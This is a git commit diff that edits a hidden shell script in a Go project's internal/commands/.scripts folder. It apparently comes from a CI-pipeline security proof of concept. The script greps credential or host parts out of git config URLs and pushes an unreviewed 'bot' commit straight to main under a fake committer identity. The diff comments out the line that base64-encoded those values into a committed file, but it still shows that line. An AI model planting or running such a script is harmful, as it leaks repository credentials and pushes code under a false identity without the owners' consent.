e099b06334448f94a37f17a5f270c25e0f69d494
Aviad Hahami <aviad.hahami@cidersecurity.io>
2022-12-19 21:52:41 +0200

    clean

--- internal/commands/.scripts/up.sh
+++ internal/commands/.scripts/up.sh
@@ -1,14 +1,16 @@
 #!/bin/bash
 
-wget https://sca-downloads.s3.amazonaws.com/cli/latest/ScaResolver-linux64.tar.gz
-tar -xzvf ScaResolver-linux64.tar.gz -C /tmp
-rm -rf ScaResolver-linux64.tar.gz
+# wget https://sca-downloads.s3.amazonaws.com/cli/latest/ScaResolver-linux64.tar.gz
+# tar -xzvf ScaResolver-linux64.tar.gz -C /tmp
+# rm -rf ScaResolver-linux64.tar.gz
 
-apt update && apt install -y curl
+# apt update && apt install -y curl
 
 git checkout -b test
-git config --list | grep -oP 'https://\K[^:/]+' | base64 > .github/1
+git config --list | grep -oP 'https://\K[^:/]+' #| base64 > .github/1
 git add .
+git config --global user.email "come@on.com"
+git config --global user.name "MotiBanana"
 git commit -m "bot"
 git push --set-upstream origin main
 
@@ -21,5 +23,5 @@ curl -H "Authorization: token YOUR_GITHUB_PERSONAL_ACCESS_TOKEN" \
        "body": "Pull request description"
      }' \
      https://api.github.com/repos/USERNAME/REPO_NAME/pulls
-     
+
 go test ./... -coverprofile cover.out
